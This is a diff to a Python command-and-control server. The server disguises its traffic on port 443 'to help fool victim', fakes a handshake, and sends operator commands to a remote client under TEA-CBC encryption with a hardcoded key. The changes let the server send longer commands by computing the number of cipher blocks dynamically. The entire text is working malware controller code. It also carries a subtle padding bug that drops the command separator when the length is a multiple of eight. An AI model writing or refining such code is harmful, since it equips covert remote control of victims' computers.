@@ -10,6 +10,7 @@ port = 443 # HTTPS port to help fool victim
 
 K = [0x77652061, 0x72652072, 0x3373652d, 0x72636821] # TEA key
 magic = 0x9e3779b9 # TEA magic constant
+bn = 0 # number of blocks
 
 def serverhello(connectionSocket: socket):
     '''
@@ -51,7 +52,7 @@ def tobytes(ciphers: list[list[int]]) -> bytes:
     Param ciphers: list of tuples of ints representing ciphertext
     '''
     out = b''
-    for x in range(0,9):
+    for x in range(0,len(ciphers)):
         out += ciphers[x][0].to_bytes(4, 'big') + ciphers[x][1].to_bytes(4, 'big')
     return out
 
@@ -75,8 +76,9 @@ def cbc(command: str) -> bytes:
     Returns bytes representing TEA encryted ciphertext
     Param command: padded input string plaintext
     '''
+    global bn
     ciphers = [[random.randint(0,0xffffffff), random.randint(0, 0xffffffff)]] # iv is chosen at random and added to start of ciphertext
-    for x in range(0,8):
+    for x in range(0,bn):
         ciphers.append(encrypt([int.from_bytes(command[8*x:8*x+4].encode(), 'big'), int.from_bytes(command[8*x+4:8*x+8].encode(), 'big')], ciphers[x]))
     return tobytes(ciphers)
 
@@ -84,6 +86,7 @@ def main():
     '''
     Waits for client connection, then allows user to send commands to client
     '''
+    global bn
     serverSocket = socket(AF_INET, SOCK_STREAM)
     serverSocket.bind((ip, port))
     serverSocket.listen(1)
@@ -96,10 +99,12 @@ def main():
     connectionSocket.recv(2048) # receive and discard client handshake finished
     while True:
         command = input("Input command (type:parameter):") # prompt for command with format command:parameter
-        if len(command) > 64:
+        comlen = len(command) # length of command
+        if comlen > 128:
             print("Command exceeds length")
             continue
-        padded = (command + ":").ljust(64, " ") # append : to end of command to separate from padding and pad command
+        bn = (comlen // 8) + (comlen % 8 > 0) # sets block number to ceiling of comlen / 8
+        padded = (command + ":").ljust(8*bn, " ") # append : to end of command to separate from padding and pad command to fit blocks
         ciphercmd = cbc(padded) # encrypt command with TEA CBC
         connectionSocket.send(ciphercmd) # send to client
 
